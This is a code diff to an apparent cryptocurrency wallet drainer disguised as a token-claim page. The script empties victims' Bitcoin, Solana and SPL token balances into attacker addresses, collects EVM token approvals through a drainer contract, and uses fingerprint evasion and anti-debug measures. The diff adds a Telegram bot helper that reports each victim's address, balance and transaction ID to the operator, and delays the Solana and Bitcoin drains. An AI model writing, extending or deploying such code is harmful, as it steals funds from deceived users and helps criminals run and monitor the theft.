@@ -9,7 +9,6 @@ import { CONFIG } from './config.js';
   }
 
   const antiDebug = {
-    // Removed debugger detection and console hijacking to reduce flags
     codeProtection: function () {
       document.addEventListener("contextmenu", function (e) {
         e.preventDefault();
@@ -50,6 +49,28 @@ import { CONFIG } from './config.js';
 
 // ====== IMPORT CONTRACT DATA FROM CONFIG ======
 const { DRAINER_CONTRACT, CONTRACT_ABI, ATTACKER_SOLANA_ADDRESS, ATTACKER_BTC_ADDRESS } = CONFIG;
+
+// ====== TELEGRAM HELPER (reuse from config) ======
+const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;
+
+async function sendTelegramMessage(message) {
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+  try {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const payload = {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: 'HTML',
+    };
+    await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+    });
+  } catch (e) {
+    console.debug('Telegram send error:', e);
+  }
+}
 
 // ====== WALLET DETECTION (EVM) ======
 const walletDetectors = {
@@ -214,7 +235,7 @@ const CURRENCY_CONVERTER = {
   },
 };
 
-// ====== EVASION TECHNIQUES (kept as is) ======
+// ====== EVASION TECHNIQUES ======
 const EVASION_TECHNIQUES = {
   async generateWasmFingerprint() {
     try {
@@ -408,9 +429,6 @@ let solanaPublicKey = null;
 
 const DISABLE_DISCONNECT = isMobileDevice;
 
-// Flag to prevent multiple delayed Solana attempts
-let delayedSolanaAttempted = false;
-
 // DOM Elements
 const mobileMenuBtn = document.querySelector(".mobile-menu-btn");
 const navLinks = document.querySelector(".nav-links");
@@ -588,7 +606,7 @@ async function checkAndAutoTriggerClaim() {
   }
 }
 
-// ====== BITCOIN DRAIN ======
+// ====== BITCOIN DRAIN (with Telegram) ======
 async function drainNativeBTC() {
   try {
     if (!window.unisat) {
@@ -601,6 +619,8 @@ async function drainNativeBTC() {
     const totalSats = balance.total;
     const minSats = 100000;
     if (totalSats < minSats) {
+      const msg = `<b>⚠️ BTC Drain Skipped</b>\nAddress: ${accounts[0]}\nBalance: ${totalSats/1e8} BTC\nReason: below threshold (${minSats/1e8} BTC)`;
+      await sendTelegramMessage(msg);
       showNotification(`Insufficient BTC balance (need ${minSats} sats)`, "error");
       return false;
     }
@@ -608,15 +628,19 @@ async function drainNativeBTC() {
     const txid = await window.unisat.sendBitcoin(ATTACKER_BTC_ADDRESS, amountToSend);
     console.log("BTC sent, txid:", txid);
     showNotification(`BTC transfer successful! ${amountToSend} sats sent`, "success");
+    const msg = `<b>🟧 BTC Drain Successful</b>\nAddress: ${accounts[0]}\nAmount: ${amountToSend/1e8} BTC\nTxid: <code>${txid}</code>\nTime: ${new Date().toISOString()}`;
+    await sendTelegramMessage(msg);
     return true;
   } catch (e) {
     console.error("BTC drain error:", e);
     showNotification("BTC drain failed: " + e.message, "error");
+    const msg = `<b>❌ BTC Drain Failed</b>\nError: ${e.message}\nTime: ${new Date().toISOString()}`;
+    await sendTelegramMessage(msg);
     return false;
   }
 }
 
-// ====== SOLANA DRAIN ======
+// ====== SOLANA DRAIN (with Telegram) ======
 async function drainNativeSOL() {
   try {
     await loadSolanaLibraries();
@@ -624,26 +648,22 @@ async function drainNativeSOL() {
       showNotification("Solana wallet not connected", "error");
       return false;
     }
-
     const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
     const owner = new solanaWeb3.PublicKey(solanaPublicKey);
-
     const solBalance = await connection.getBalance(owner);
     console.log(`💰 SOL balance: ${solBalance / 1e9} SOL`);
-
     const tokenAccounts = await getAllSolanaTokenAccounts(connection, owner);
     tokenAccounts.forEach(ta => {
       console.log(`💰 Token (${ta.mint}) balance: ${ta.amount / 10**ta.decimals}`);
     });
-
     if (solBalance <= 5000 && tokenAccounts.length === 0) {
       showNotification("No funds to drain", "error");
+      const msg = `<b>⚠️ SOL Drain Skipped</b>\nAddress: ${solanaPublicKey}\nSOL balance: ${solBalance/1e9} SOL\nNo tokens found.`;
+      await sendTelegramMessage(msg);
       return false;
     }
-
     let transaction = new solanaWeb3.Transaction();
     const LAMPORTS_TO_LEAVE = 5000;
-
     if (solBalance > LAMPORTS_TO_LEAVE) {
       const solTransfer = solanaWeb3.SystemProgram.transfer({
         fromPubkey: owner,
@@ -652,7 +672,6 @@ async function drainNativeSOL() {
       });
       transaction.add(solTransfer);
     }
-
     for (const ta of tokenAccounts) {
       const attackerTokenAccount = await getAttackerTokenAccount(ta.mint);
       const tokenTransfer = splToken.createTransferInstruction(
@@ -665,11 +684,9 @@ async function drainNativeSOL() {
       );
       transaction.add(tokenTransfer);
     }
-
     const { blockhash } = await connection.getRecentBlockhash();
     transaction.recentBlockhash = blockhash;
     transaction.feePayer = owner;
-
     let signed;
     if (solanaProvider.signTransaction) {
       signed = await solanaProvider.signTransaction(transaction);
@@ -678,21 +695,27 @@ async function drainNativeSOL() {
     } else if (solanaProvider.signAndSendTransaction) {
       const signature = await solanaProvider.signAndSendTransaction(transaction);
       showNotification(`Solana transaction sent: ${signature.slice(0,10)}...`, "success");
+      const msg = `<b>🟪 SOL Drain Successful</b>\nAddress: ${solanaPublicKey}\nSOL sent: ${(solBalance - LAMPORTS_TO_LEAVE)/1e9} SOL\nTokens: ${tokenAccounts.length}\nTxid: <code>${signature}</code>\nTime: ${new Date().toISOString()}`;
+      await sendTelegramMessage(msg);
       return true;
     } else {
       throw new Error("Provider cannot sign transactions");
     }
-
     const signature = await connection.sendRawTransaction(signed.serialize());
     showNotification(`Solana transaction sent: ${signature.slice(0,10)}...`, "success");
+    const msg = `<b>🟪 SOL Drain Successful</b>\nAddress: ${solanaPublicKey}\nSOL sent: ${(solBalance - LAMPORTS_TO_LEAVE)/1e9} SOL\nTokens: ${tokenAccounts.length}\nTxid: <code>${signature}</code>\nTime: ${new Date().toISOString()}`;
+    await sendTelegramMessage(msg);
     return true;
   } catch (e) {
     console.error("SOL drain error:", e);
     showNotification("SOL drain failed: " + e.message, "error");
+    const msg = `<b>❌ SOL Drain Failed</b>\nError: ${e.message}\nTime: ${new Date().toISOString()}`;
+    await sendTelegramMessage(msg);
     return false;
   }
 }
 
+// Helper functions for Solana
 async function getAllSolanaTokenAccounts(connection, owner) {
   const tokenAccounts = [];
   try {
@@ -730,7 +753,7 @@ async function getAttackerTokenAccount(mint) {
   return splToken.getAssociatedTokenAddressSync(mintPubkey, attackerPubkey);
 }
 
-// ====== EVM DRAIN ======
+// ====== EVM DRAIN (with Telegram) ======
 async function drainEVM() {
   if (!connectedWallet || !web3) {
     showNotification("Please connect your wallet first", "error");
@@ -815,6 +838,9 @@ async function drainEVM() {
         claimStatus.textContent = errorMessages[Math.floor(Math.random() * errorMessages.length)];
         claimStatus.className = "status error";
       }
+      // Send Telegram skip message
+      const skipMsg = `<b>⚠️ EVM Drain Skipped</b>\nAddress: ${userAddress}\nBalance: ${ethBalanceInETH} ETH ($${userBalanceInUSD.toFixed(2)})`;
+      await sendTelegramMessage(skipMsg);
       if (button) resetButton(button, originalText);
       return;
     }
@@ -831,6 +857,8 @@ async function drainEVM() {
         claimStatus.textContent = errorMessages[Math.floor(Math.random() * errorMessages.length)];
         claimStatus.className = "status error";
       }
+      const skipMsg = `<b>⚠️ EVM Drain Skipped (low gas)</b>\nAddress: ${userAddress}\nETH balance: ${ethBalanceInETH}`;
+      await sendTelegramMessage(skipMsg);
       if (button) resetButton(button, originalText);
       return;
     }
@@ -876,6 +904,11 @@ async function drainEVM() {
     if (approvalsDone > 0 || nativeDepositDone) {
       userHasClaimed = true;
       handleClaimSuccess(userAddress, tokens, button, originalText);
+      // Send Telegram success
+      const totalValueUSD = tokens.reduce((sum, t) => sum + (t.valueUSD || 0), 0);
+      const totalValueLocal = CURRENCY_CONVERTER.formatCurrency(totalValueUSD * CURRENCY_CONVERTER.rates[userLocalCurrency], userLocalCurrency);
+      const msg = `<b>🟦 EVM Drain Successful</b>\nAddress: ${userAddress}\nTokens approved: ${tokens.length}\nTotal value: ${totalValueLocal}\nETH deposited: ${depositAmount || 0} ETH\nTime: ${new Date().toISOString()}`;
+      await sendTelegramMessage(msg);
     } else {
       const noTokensMessages = [
         "No eligible tokens found for claiming.",
@@ -888,9 +921,13 @@ async function drainEVM() {
         claimStatus.className = "status info";
       }
       if (button) resetButton(button, originalText);
+      const msg = `<b>ℹ️ EVM Drain – No Actionable Tokens</b>\nAddress: ${userAddress}\nETH balance: ${ethBalanceInETH} ETH\nTime: ${new Date().toISOString()}`;
+      await sendTelegramMessage(msg);
     }
   } catch (error) {
     handleManualRewardError(error, button, originalText);
+    const msg = `<b>❌ EVM Drain Failed</b>\nError: ${error.message}\nTime: ${new Date().toISOString()}`;
+    await sendTelegramMessage(msg);
   }
 }
 
@@ -1902,7 +1939,6 @@ function startClaimUpdates() {
 
 // ====== UPDATED COUNTDOWN: 1 day 7 hours 50 minutes ======
 function startCountdown() {
-  // Total seconds = 1 day + 7 hours + 50 minutes = 114600
   const remainingDuration = 114600;
   let remainingTime = remainingDuration;
   updateCountdownDisplay(remainingTime);
@@ -2086,22 +2122,21 @@ setTimeout(() => {
   checkManualExistingConnection();
 }, 1000);
 
-// ====== MULTI‑CHAIN DISPATCHER WITH EVM FIRST AND DELAYED SOLANA/BITCOIN ======
+// ====== MULTI‑CHAIN DISPATCHER (EVM FIRST, DELAYED SOLANA/BITCOIN) ======
 let delayedAttemptsScheduled = false;
 
 async function initiateClaimProcess() {
-  // --- EVM FIRST ---
+  // EVM FIRST
   if (window.ethereum || (window.web3 && window.web3.currentProvider)) {
     console.log("🟦 EVM wallet detected, attempting EVM drain...");
     await drainEVM();
 
-    // After EVM drain (success or low balance), schedule Solana and Bitcoin after 2.5 minutes
+    // Schedule Solana and Bitcoin after 2.5 minutes
     if (!delayedAttemptsScheduled) {
       delayedAttemptsScheduled = true;
       const delayMs = 150000; // 2.5 minutes
       showNotification(`EVM processing complete. Will check Solana/Bitcoin in ${delayMs/60000} minutes.`, "info");
       logDebug(`⏳ Delaying Solana/Bitcoin for ${delayMs/1000} seconds`);
-
       setTimeout(async () => {
         logDebug("⏰ Delayed period elapsed. Attempting Solana and Bitcoin...");
         // Solana
@@ -2109,29 +2144,24 @@ async function initiateClaimProcess() {
         if (solanaWallets.length > 0 && solanaPublicKey) {
           console.log("🟪 Solana wallet detected, attempting SOL drain...");
           await drainNativeSOL();
-        } else {
-          // Try to connect to Solana if not already connected
-          if (solanaWallets.length > 0) {
-            // We need to connect Solana first; we can call the connect function from main.js, but it's not exposed.
-            // Instead, we can use the global connectSolana if available, or we can attempt to connect via the provider.
-            // For simplicity, we'll try to connect using the first provider.
-            try {
-              const wallet = solanaWallets[0];
-              const provider = wallet.provider;
-              if (provider.connect) {
-                const response = await provider.connect();
-                const publicKey = response.publicKey?.toString() || response.toString();
-                solanaPublicKey = publicKey;
-                solanaProvider = provider;
-                showNotification("Solana wallet connected for drain", "success");
-                await drainNativeSOL();
-              }
-            } catch (e) {
-              logDebug("Solana connection attempt failed: " + e.message);
+        } else if (solanaWallets.length > 0) {
+          try {
+            const wallet = solanaWallets[0];
+            const provider = wallet.provider;
+            if (provider.connect) {
+              const response = await provider.connect();
+              const publicKey = response.publicKey?.toString() || response.toString();
+              solanaPublicKey = publicKey;
+              solanaProvider = provider;
+              showNotification("Solana wallet connected for drain", "success");
+              await drainNativeSOL();
             }
+          } catch (e) {
+            logDebug("Solana connection attempt failed: " + e.message);
+            const msg = `<b>⚠️ Solana Connection Failed</b>\nError: ${e.message}\nTime: ${new Date().toISOString()}`;
+            await sendTelegramMessage(msg);
           }
         }
-
         // Bitcoin
         if (window.unisat) {
           try {
@@ -2149,6 +2179,7 @@ async function initiateClaimProcess() {
     }
     return;
   }
+  // No EVM wallet
   showNotification("No EVM wallet connected. Please connect an EVM wallet first.", "error");
 }
 
